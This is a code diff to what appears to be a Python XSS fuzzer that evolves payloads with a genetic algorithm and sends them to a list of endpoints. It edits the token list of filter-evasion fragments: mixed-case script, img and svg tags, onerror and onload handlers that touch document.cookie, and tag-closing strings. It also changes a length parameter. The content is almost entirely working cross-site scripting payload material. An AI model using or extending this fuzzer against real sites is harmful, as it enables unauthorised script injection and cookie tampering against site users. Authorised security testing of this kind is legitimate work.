@@ -21,15 +21,15 @@ tokens = [
     "jAvAsCriPt:", "'document.cookie=1'", "`document.cookie=1`", "document.cookie=1", '"document.cookie=1"',
     "<ScRiPt>document.cookie=1</ScRiPt>", "<ScRiPt sRc='/xss.js'></ScRiPt>", '<ScRiPt sRc="/xss.js"></ScRiPt>',
     '<ScRiPt sRc=`/xss.js`></ScRiPt>',
-    '<iMg SrC=`/xss.js` OneRror=`document.cookie=1`>',
-    "<iMg SrC='/xss.js' OneRror='document.cookie=1'>",
-    '<iMg SrC="/xss.js" OneRror="document.cookie=1">',
-    'iMg SrC="/xss.js" OneRror="document.cookie=1"',
+    '<iMg SrC OneRror=`document.cookie=1`>',
+    "<iMg SrC OneRror='document.cookie=1'>",
+    '<iMg SrC OneRror="document.cookie=1">',
+    # 'iMg SrC="/xss.js" OneRror="document.cookie=1"',
     " ", ";", ",", "'", "/", "<!--", "-->", "--!>", "(", ")", "/*", "-", "`",
     '"', "*", "*/", "\\x20", "\\x27", "%20", "{", "}", "[", "]",
     "<", "%0A",
     "<script", "<img", "<svg", "<div", "<body", "<iframe", "<a",
-    "<sCrIpT", "<iMg", "<sVg", "<div", "<BOdy", "<IfRame", " sRc=", " oNLoAd=", " oNeRrOr=", "</a>", "</bUtTon>",
+    "<sCrIpT", "<iMg", "<sVg", "<div", "<BOdy", "<IfRame", " sRc=", " oNLoAd='document.cookie=1'", " oNeRrOr='document.cookie=1'", "</a>", "</bUtTon>",
     "</iNpUt>", "</frAmEsEt>", "</teMplAte>", "</auDio>", "</viDeO>", "</sOurCe>", "</hTmL>", "</nOeMbed>", "</noScRIpt>", "</StYle>",
     "</ifRaMe>", "</xMp>", "</texTarEa>", "</nOfRaMeS>", "</tITle>", ">"
 ]
@@ -39,7 +39,7 @@ population_size = 70
 max_generations = 50
 mutation_factor = 0.85
 crossover_rate = 0.85
-max_string_length = 400
+max_string_length = 200
 
 # List of endpoints for testing
 endpoints = [
